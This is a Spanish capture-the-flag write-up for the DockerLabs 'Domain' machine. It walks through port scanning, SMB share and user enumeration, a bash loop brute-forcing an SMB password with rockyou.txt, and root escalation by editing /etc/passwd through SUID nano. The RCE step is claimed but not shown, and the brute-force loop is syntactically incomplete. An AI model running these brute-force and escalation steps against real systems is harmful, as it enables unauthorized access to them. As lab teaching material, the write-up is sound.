Máquina: [Domain](https://dockerlabs.es/#/#Domain), from DockerLabs

## 1) Como siempre iniciamos con un escaneo de puertos contra la IP destino
```
nmap -p- --open -sS -vvv --min-rate 3000 -n 172.17.0.2
```

| Port | Service|
|   :--  |    :--: |
|80      | http        |
|139     | netbios-ssn |
|445     | microsoft-ds|

Los puertos 139 y 445 se utilizan para el protocolo Server Message Blocks (SMB). Protocolo que se emplea para compartir archivos, impresoras, dispositivos en una red.

## 2) Veamos qué recursos compartidos hay 
```
smbclient -L=\<IP>
```

`-L <IP>: obtener una lista de recursos compartidos brindados por la IP destino.`

Obtenemos los siguientes resultados

| Sharename | Type | Comment|
| :-- | :-- | :--|
| print$ | Disk| Printer Drivers |
| html | Disk | HTML Share |
| IPC$ | IPC | IPC Service |

De los recursos compartidos el que más nos interesa será el `html` puesto que si logramos almacenar un archivo allí que luego podamos acceder por medio del puerto 80 entonces podriamos lograr RCE.
Para ello primero necesitamos identifiacr que usuarios hay y encontrar las credenciales de alguno con acceso de escritura en dicho recurso.

## 3) Usamos rpcclientsirve para averiguar los usuarios del sistema, necesitamos alguno que tenga permiso al shared disk del servicio SMB.
```
rpcclient -N 172.17.0.2 -U ''
```
`-N <IP>: la dirección IP target`\
`-U: el user, en este caso en blanco porque lo desconocemos`

Una vez que estamos dentro de la herramienta, ejecutamos `enumdomusers` y obtenemos 2 usuarios presentes en el servicio SMB: Bob y James

## 4) Hacemos fuerza bruta hasta encontrar la contraseña de un usuario
Para verificar si puedo conectarme con smbclient seria
`smbclient \\\\172.17.0.2\\<SHARED DISK> --user=<USER>%<$PASSW>`
Ahí hago fuzzing en `$PASSW` con _rockyou.txt_ en búsqueda de la contraseña. En principio reemplazo `<USER>` con uno y verifico que tenga permisos de escritura en el shared disk, cuyo nombre es html. El comando quedaría

```
smbclient \\\\172.17.0.2\\html --user=bob%$FUZZ
```
`$FUZZ` será donde reemplazamos por las entradas de `rockyou.txt` en este caso lo hacemos con simple bash, lo cual va a demorar pues está corriendo todo en 1 solo thread.

```
for f in $(cat /usr/share/wordlists/rockyou.txt); if smbclient -L=172.17.0.2 -U bob%$f &>/dev/null; then echo password: $f; fi
```

## 5) Escalamos privilegios
Ejecutamos el siguiente comando para encontrar archivos sobre los que en algún momento se ejecutó el comando `chmod u+s` activando el `SUID`.
```
find / -perm -4000 2>/dev/null
```
Encuentro el archivo `/usr/bin/nano`.\
Esto quiere decir que puedo ejecutar nano con los permisos del usuario `root` con lo cual puedo editar el archivo de texto `/etc/passwd` y modificar la siguiente entrada
`root:x:0:0:root:/root:/bin/bash` --> `root::0:0:root:/root:/bin/bash`

Es decir al elimiar la **x** ya no me pedirá contraseña para acceder al usuario root.
Finalmente podemos ejecutar `su` y accedemos al usuario root.

## Resumen del ataque

Este método funcionó por lo siguiente:
* Los puertos de SMB y HTTP (139,445,80) están abiertos
* Encontramos 2 usuarios del sistema target
* La password del usuario era muy simple y se le pudo hacer fuerza bruta, logrando conexión via smbclient
* Logramos RCE ejecutando un archivo via HTTP que previamente había sido compartido por SMB.
* El usuario puede correr `/usr/bin/nano` como root
